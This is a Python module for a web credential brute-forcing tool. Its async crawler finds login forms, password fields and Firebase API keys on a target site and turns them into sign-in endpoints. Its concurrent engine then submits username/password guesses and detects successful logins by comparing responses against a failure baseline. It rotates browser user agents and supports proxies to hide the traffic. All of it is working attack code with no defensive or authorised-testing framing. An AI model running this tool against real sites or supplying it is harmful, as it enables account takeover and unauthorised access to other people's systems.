"""
WebAuth Core Engine - Discovery & Brute Force Logic.
"""

import asyncio
import aiohttp
import urllib.parse
import hashlib
import json
import random
import re
import logging
from typing import List, Dict, Optional, Set
from difflib import SequenceMatcher
from .models import AuthEndpoint, AuthBaseline

# Improved Parsing
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)

class DiscoveryEngine:
    """Asynchronous BFS Crawler for identifying authentication entry points."""
    def __init__(self, session: aiohttp.ClientSession, target: str, max_pages: int = 50, proxy: str = None):
        self.session = session
        self.target = target
        self.max_pages = max_pages
        self.proxy = proxy
        self.visited: Set[str] = set()
        self.endpoints: List[AuthEndpoint] = []
        self.queue = asyncio.Queue()

    async def run(self) -> List[AuthEndpoint]:
        """Initiates the concurrent discovery process."""
        await self.queue.put(self.target)
        workers = [asyncio.create_task(self._worker()) for _ in range(5)]
        try:
            await asyncio.wait_for(self.queue.join(), timeout=300)
        except asyncio.TimeoutError:
            pass
        for w in workers: w.cancel()
        return self.endpoints

    async def _worker(self):
        while True:
            url = await self.queue.get()
            try:
                url = url.split("#")[0].rstrip("/")
                if url in self.visited or len(self.visited) >= self.max_pages or not url.startswith("http"):
                    continue
                self.visited.add(url)
                async with self.session.get(url, headers={'User-Agent': get_random_ua()}, proxy=self.proxy, timeout=10) as resp:
                    if resp.status != 200: continue
                    body = await resp.text(errors='ignore')
                    
                    if HAS_BS4: await self._extract_bs4(body, url)
                    
                    content_type = resp.headers.get("Content-Type", "").lower()
                    if "text/html" in content_type:
                        await self._find_links(body, url)
                    
                    # Heuristic for Firebase even in JS files
                    if "application/javascript" in content_type or url.endswith(".js") or "text/html" in content_type:
                        if 'apiKey' in body and 'authDomain' in body:
                            self._extract_firebase(body, url)
            except Exception: pass
            finally: self.queue.task_done()

    async def _find_links(self, html, source):
        if HAS_BS4:
            soup = BeautifulSoup(html, 'html.parser')
            # 1. Standard Links
            for link in soup.find_all('a', href=True):
                n = urllib.parse.urljoin(source, link.get('href'))
                if urllib.parse.urlparse(n).netloc == urllib.parse.urlparse(self.target).netloc:
                    await self.queue.put(n)
            # 2. Script Files (Deep Crawl)
            for script in soup.find_all('script', src=True):
                n = urllib.parse.urljoin(source, script.get('src'))
                if urllib.parse.urlparse(n).netloc == urllib.parse.urlparse(self.target).netloc:
                    await self.queue.put(n)

    async def _extract_bs4(self, html, source):
        soup = BeautifulSoup(html, 'html.parser')
        
        # 1. Aggressive Form Discovery (Standard & SPA)
        forms = soup.find_all('form')
        
        # Heuristic: If no forms, look for <div> or <section> containing password inputs
        if not forms:
            wrappers = soup.find_all(['div', 'section', 'main'])
            for wrap in wrappers:
                if wrap.find('input', {'type': 'password'}):
                    forms.append(wrap)

        for form in forms:
            # Determine Action (Default to current page for SPAs)
            action = urllib.parse.urljoin(source, form.get('action') or source)
            method = (form.get('method') or 'POST').upper()
            
            u_field, p_field = None, None
            inputs = {}
            
            # Extract all interactive elements
            for inp in form.find_all(['input', 'textarea', 'select']):
                # Capture both Name and ID (modern apps often use ID)
                name = inp.get('name') or inp.get('id')
                if not name: continue
                
                itype = (inp.get('type') or 'text').lower()
                
                # Logic: Identify Password Field
                if itype == "password" or "pass" in name.lower() or "pwd" in name.lower():
                    p_field = name
                # Logic: Identify Username/Email Field
                elif any(x in name.lower() for x in ["user", "email", "login", "id"]):
                    u_field = name
                
                inputs[name] = inp.get('value') or ''

            # If we identified a pair, add it
            if u_field and p_field:
                self._add_ep(action, 'universal_json' if not form.name == 'form' else 'form_urlencoded', method, u_field, p_field, {k:v for k,v in inputs.items() if k not in [u_field, p_field]}, source)

        # 2. Universal Page Search (Global Catch-all)
        # This catches "naked" inputs sitting directly in the body
        all_pwd = soup.find_all('input', {'type': 'password'})
        for p_inp in all_pwd:
            p_name = p_inp.get('name') or p_inp.get('id')
            # Look for the nearest text/email input before it
            prev_inputs = p_inp.find_all_previous('input', limit=5)
            for u_inp in prev_inputs:
                u_name = u_inp.get('name') or u_inp.get('id')
                if not u_name: continue
                itype = (u_inp.get('type') or 'text').lower()
                if any(x in u_name.lower() for x in ["user", "email", "login", "id"]):
                    self._add_ep(source, 'universal_json', 'POST', u_name, p_name, {}, source)
                    break

    def _extract_firebase(self, body, source):
        api_key_m = re.search(r'apiKey\s*:\s*["\']([^"\']+)["\']', body)
        if api_key_m:
            firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key_m.group(1)}"
            self._add_ep(firebase_url, 'universal_json', 'POST', 'email', 'password', {"returnSecureToken": True}, source)

    def _add_ep(self, url, auth_type, method, u, p, extra, source):
        ep = AuthEndpoint(url, auth_type, method, u, p, extra, source)
        if not any(e.url == ep.url for e in self.endpoints):
            self.endpoints.append(ep)


class BruteEngine:
    """Intelligence-driven Authentication Tester with Fuzzy Logic support."""
    def __init__(self, session: aiohttp.ClientSession, concurrency: int = 10, proxy: str = None):
        self.session = session
        self.sem = asyncio.Semaphore(concurrency)
        self.proxy = proxy
        self.baselines: Dict[str, AuthBaseline] = {}
        self.results = []
        self.rate_limited = False

    async def capture_baseline(self, ep: AuthEndpoint):
        """Establishes the failure signature for differential analysis."""
        try:
            payload = {ep.username_field: 'invalid_user', ep.password_field: 'invalid_pass'}
            async with self.session.post(ep.url, data=payload, proxy=self.proxy, timeout=10) as resp:
                body = (await resp.text(errors='ignore')).lower()
                self.baselines[ep.url] = AuthBaseline(resp.status, len(body), body[:2000])
        except Exception: pass

    async def test(self, ep: AuthEndpoint, u: str, p: str):
        """Executes a single credential validation attempt."""
        if self.rate_limited: return
        async with self.sem:
            try:
                payload = {ep.username_field: u, ep.password_field: p, **ep.extra_fields}
                async with self.session.post(ep.url, data=payload, proxy=self.proxy, allow_redirects=False, timeout=10) as resp:
                    if resp.status in [429, 403]:
                        self.rate_limited = True
                        return
                    body = (await resp.text(errors='ignore')).lower()
                    base = self.baselines.get(ep.url)
                    if base:
                        if resp.status != base.failed_status and resp.status in [200, 301, 302]:
                            self.results.append((ep.url, u, p))
                        elif SequenceMatcher(None, body[:2000], base.failed_body_sample).ratio() < 0.8:
                            if not any(x in body for x in ["invalid", "incorrect", "fail"]):
                                self.results.append((ep.url, u, p))
            except Exception: pass
